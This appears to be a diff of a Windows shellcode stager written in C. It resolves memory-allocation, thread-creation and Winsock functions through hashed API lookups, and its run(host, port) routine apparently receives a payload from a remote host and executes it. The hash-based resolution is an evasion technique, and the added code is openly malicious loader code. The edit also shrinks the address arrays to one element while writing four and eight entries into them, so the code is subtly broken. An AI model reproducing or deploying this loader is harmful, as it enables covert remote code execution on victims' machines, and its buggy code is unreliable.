@@ -43,7 +43,7 @@ int run(const char* host, const char* port)
     */
 
     HMODULE kernel32_module = GetModuleHandleManualHash(KERNEL32_DLL_HASH);
-	FARPROC funcAddresses[4] = {NULL};
+	FARPROC funcAddresses[] = {NULL};
 	DWORD hashes[] = {VIRTUALALLOC_HASH, VIRTUALPROTECT_HASH, CREATETHREAD_HASH, WAITFORSINGLEOBJECT_HASH};
 
 	int val = GetProcAddressManualHashes(
@@ -119,7 +119,35 @@ int run(const char* host, const char* port)
 	}
 
     //HMODULE ws2_32_module = GetModuleHandleManualHash(WS2_32_DLL_HASH); // TODO: this would need to be changed to loadlib or something
+	FARPROC funcAddresses1[] = {NULL};
+	DWORD hashes1[] = {WSASTARTUP_HASH, WSACLEANUP_HASH, GETADDRINFO_HASH, FREEADDRINFO_HASH, SOCKET_HASH, CLOSESOCKET_HASH, CONNECT_HASH, RECV_HASH};
 
+	val = GetProcAddressManualHashes(
+				ws2_32_module, 
+				hashes1,
+				funcAddresses1,
+				8
+				);
+
+	if (val != 0)
+	{
+		printf("error\n");
+		return 1;
+	}
+	else
+	{
+		printf("working\n");
+	}
+
+    FuncWSAStartup pWSAStartup = (FuncWSAStartup)funcAddresses1[0];
+    FuncWSACleanup pWSACleanup = (FuncWSACleanup)funcAddresses1[1];
+    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)funcAddresses1[2];
+	FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)funcAddresses1[3];
+	FuncSocket pSocket = (FuncSocket)funcAddresses1[4];
+	FuncCloseSocket pCloseSocket = (FuncCloseSocket)funcAddresses1[5];
+	FuncConnect pConnect = (FuncConnect)funcAddresses1[6];
+	FuncRecv pRecv = (FuncRecv)funcAddresses1[7];
+ 	/*
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualHash(ws2_32_module, WSASTARTUP_HASH);
     FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualHash(ws2_32_module, WSACLEANUP_HASH);
     FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualHash(ws2_32_module, GETADDRINFO_HASH);
@@ -128,6 +156,7 @@ int run(const char* host, const char* port)
     FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualHash(ws2_32_module, CLOSESOCKET_HASH);
     FuncConnect pConnect = (FuncConnect)GetProcAddressManualHash(ws2_32_module, CONNECT_HASH);
     FuncRecv pRecv = (FuncRecv)GetProcAddressManualHash(ws2_32_module, RECV_HASH);
+	*/
 
     //std::cout << "1 - Starting" << std::endl;
 	// printf("1 - Starting\n");
